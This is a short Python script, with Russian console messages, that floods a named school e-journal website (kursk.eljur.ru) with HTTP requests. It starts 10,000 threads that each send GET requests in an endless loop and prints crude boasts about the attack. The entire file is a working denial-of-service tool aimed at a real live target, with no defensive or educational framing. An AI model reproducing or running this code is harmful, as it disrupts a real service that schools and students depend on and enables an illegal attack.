import threading
import requests
import time

def dos(target):
    while True:
        try:
            res = requests.get(target)
            print("Пакет отправлен")
        except requests.exceptions.ConnectionError:
            print("==> Сайту плохо <==")
	

for i in range(0, 10000):
    thr = threading.Thread(target=dos, args=('https://kursk.eljur.ru/',))
    thr.start()
    print(str(i + 1) + " пакет, взлом жопы пошёл")